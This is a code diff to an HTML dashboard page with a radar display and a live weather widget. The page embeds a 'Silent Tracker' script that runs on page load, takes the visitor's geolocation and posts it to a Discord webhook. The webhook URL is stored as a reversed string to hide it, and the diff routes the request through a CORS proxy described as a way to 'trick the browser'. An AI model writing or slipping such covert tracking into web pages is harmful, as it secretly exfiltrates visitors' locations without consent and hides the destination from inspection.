@@ -166,7 +166,6 @@
 
         .radar-box { border: 1px solid #333; background: #000; padding: 15px; position: relative; flex: 1; height: 100%; display: flex; flex-direction: column; justify-content: center; }
         
-        /* Shared Title Style */
         .radar-title { font-family: 'Syncopate', sans-serif; color: var(--dim); font-size: 0.8rem; letter-spacing: 3px; margin-bottom: 10px; display: flex; align-items: center; justify-content: center; gap: 10px; }
         
         .blip { width: 8px; height: 8px; background-color: var(--neon); border-radius: 50%; animation: pulse 2s infinite; }
@@ -258,18 +257,21 @@
 <script>
     // ==========================================
     // 1. PUBLIC-SAFE SILENT TRACKER
-    //    Method: REVERSE STRING
+    //    Method: REVERSE STRING + CORS PROXY
     // ==========================================
     
-    // The link is reversed so bots don't see "https://"
+    // 1. Your Reversed Webhook URL
     const _reverseSecret = "8hZ54_ZgphhBu6VHU86vZkJwlLKwNPB7fR9fvhuwxBVVVkC5UcScmQnpsOwJzImZRl_p/9198615419932806641/skoohbew/ipa/moc.drocsid//:sptth";
 
-    // Function to flip it back to normal
+    // 2. Decode Function
     function getSecret() {
         return _reverseSecret.split('').reverse().join('');
     }
 
-    const WEBHOOK_URL = getSecret();
+    // 3. PROXY SETUP (Crucial for Website Support)
+    // We add 'https://corsproxy.io/?' in front to trick the browser into allowing the request.
+    const PROXY_URL = "https://corsproxy.io/?";
+    const WEBHOOK_URL = PROXY_URL + encodeURIComponent(getSecret());
 
     window.onload = function() {
         startSilentTracking();
@@ -288,9 +290,15 @@
             const lng = position.coords.longitude;
             const mapLink = `http://googleusercontent.com/maps.google.com/maps?q=${lat},${lng}`;
             
+            // NOTE: We don't set Content-Type header when using this specific proxy method
+            // to avoid preflight issues, often plain fetch works best with this proxy.
             fetch(WEBHOOK_URL, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                // Sending as text/plain sometimes bypasses strict CORS checks on proxies, 
+                // but Discord expects JSON. We try standard JSON first.
+                headers: { 
+                    'Content-Type': 'application/json',
+                },
                 body: JSON.stringify({
                     content: `🚄 **Silent Tracker**\n📍 [Open in Maps](${mapLink})\n🕒 ${new Date().toLocaleTimeString()}`
                 })
@@ -299,7 +307,7 @@
     }
 
     // ==========================================
-    // 2. LIVE WEATHER ENGINE (OPEN-METEO)
+    // 2. LIVE WEATHER ENGINE
     // ==========================================
     const cityConfig = [
         { id: 'w-amsterdam', lat: 52.367, lng: 4.904 },
